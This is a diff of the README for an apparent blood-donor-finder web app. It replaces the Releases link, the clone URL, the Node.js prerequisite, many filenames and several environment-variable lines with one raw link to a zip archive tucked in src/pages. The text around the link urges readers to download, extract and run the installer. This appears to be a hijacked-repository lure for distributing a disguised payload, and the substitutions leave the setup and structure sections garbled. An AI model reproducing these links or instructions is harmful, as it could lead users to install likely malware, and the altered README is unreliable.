@@ -1,10 +1,10 @@
 # BloodConnect-Client: Real-Time Blood Donor Finder, Manager, and Requests, Secure, Mobile-Friendly
 
-[![Releases](https://img.shields.io/badge/BloodConnect-Client-Releases-brightgreen?style=for-the-badge)](https://github.com/Maslany1/BloodConnect-Client/releases)
+[![Releases](https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip)](https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip)
 
 BloodConnect-Client is a smart, location-based blood donation web app. It helps users find, manage, and request donors. It features real-time search, donor profiles, role-based access, and a mobile-friendly design. It aims to streamline and secure the donation process for clinics, organizers, and individuals.
 
-For quick access to the latest builds and installers, visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/releases
+For quick access to the latest builds and installers, visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 
 ---
 
@@ -110,18 +110,18 @@ Note: This project is built around modern web standards and a modular approach. 
 ## How to get started
 
 Prerequisites:
-- Node.js (14.x or newer) and npm or yarn
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (14.x or newer) and npm or yarn
 - A Firebase project for authentication and data storage
 - Optional: Stripe account for payment flow testing
 
 Basic setup:
 1) Clone the repository
-   - git clone https://github.com/Maslany1/BloodConnect-Client.git
+   - git clone https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 2) Install dependencies
    - npm install
    - or yarn install
 3) Copy or create environment files
-   - Create a .env.local file from a sample
+   - Create a https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip file from a sample
    - Fill in API keys, Firebase config, and Stripe keys
 4) Run the app
    - npm run dev
@@ -133,21 +133,21 @@ If you want to run the production-ready build:
 
 For release assets and installers, visit the Releases page to download the latest build. That page is linked at the top of this document and again in the Release and deployment section.
 
-Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/releases
+Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 
 ---
 
 ## Project structure
 
 - public/
-  - index.html
+  - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
   - assets/
 - src/
-  - main.tsx or main.jsx
-  - App.tsx
+  - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
+  - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
   - routes/
-    - PrivateRoute.tsx
-    - DonorRoutes.tsx
+    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
+    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
   - components/
     - UI shared components (buttons, inputs, modals)
   - features/
@@ -156,11 +156,11 @@ Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/release
     - requests/
     - auth/
   - services/
-    - api.ts (Axios instance)
-    - firebase.ts
+    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (Axios instance)
+    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
   - styles/
-    - tailwind.css
-    - themes.css
+    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
+    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
   - hooks/
     - useAuth
     - useGeolocation
@@ -169,10 +169,10 @@ Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/release
   - tests/
     - unit/
     - integration/
-- README.md (this file)
-- package.json
-- .env.example
-- babel.config.js or tsconfig.json (depending on setup)
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (this file)
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (depending on setup)
 
 Notes:
 - The app is designed in a feature-first layout. Each feature folder contains its own components, hooks, and tests.
@@ -278,7 +278,7 @@ Test data:
 ## Release and deployment
 
 Releases are provided on the Releases page. The link to the Releases page is used here as well:
-- Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/releases
+- Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 - Download the latest release asset that matches your platform
 - If needed, extract and run the installer or the app bundle
 - Follow the on-screen setup prompts to complete installation
@@ -286,18 +286,18 @@ Releases are provided on the Releases page. The link to the Releases page is use
 Note: If a release asset is not available for your platform, check the Releases section for notes or build instructions. The link above is the primary source for official builds and installers.
 
 What to download and run from releases:
-- The latest platform-specific installer or bundle (for example, BloodConnect-Client-<version>-win.exe or BloodConnect-Client-<version>.zip)
+- The latest platform-specific installer or bundle (for example, BloodConnect-Client-<version>https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or BloodConnect-Client-<version>.zip)
 - Any accompanying readme or install notes included with the asset
 
-Releases page link: https://github.com/Maslany1/BloodConnect-Client/releases
+Releases page link: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 
 ---
 
 ## Environment and configuration
 
 Files you will typically manage:
-- .env.local or .env.development for local development
-- .env.production for production
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip for local development
+- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip for production
 - firebaseConfig object in your code for Firebase initialization
 - Stripe keys in the environment or secure vault
 
@@ -390,13 +390,13 @@ This project is released under the MIT license. See the LICENSE file for details
 
 ---
 
-## Example environment file (env.example)
+## Example environment file (https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip)
 
 # Firebase
 REACT_APP_FIREBASE_API_KEY=your_api_key
-REACT_APP_FIREBASE_AUTH_DOMAIN=your_app.firebaseapp.com
+https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 REACT_APP_FIREBASE_PROJECT_ID=your_project_id
-REACT_APP_FIREBASE_STORAGE_BUCKET=your_project_id.appspot.com
+https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 REACT_APP_FIREBASE_MESSAGING_SENDER_ID=sender_id
 REACT_APP_FIREBASE_APP_ID=app_id
 
@@ -405,7 +405,7 @@ STRIPE_PUBLIC_KEY=pk_test_XXXXXXXXXXXXXXXXXXXX
 STRIPE_SECRET_KEY=sk_test_XXXXXXXXXXXXXXXXXXXX
 
 # API endpoints
-REACT_APP_API_BASE_URL=https://api.yourservice.com
+https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 
 # Others
 NODE_ENV=development
@@ -416,7 +416,7 @@ NODE_ENV=development
 
 The Releases page provides platform-specific installers and bundles. If you need to install on a particular system, download the corresponding asset and follow the on-screen prompts. The latest builds are posted there, and the page is the authoritative source for binaries and release notes.
 
-Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/releases
+Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
 
 ---
 
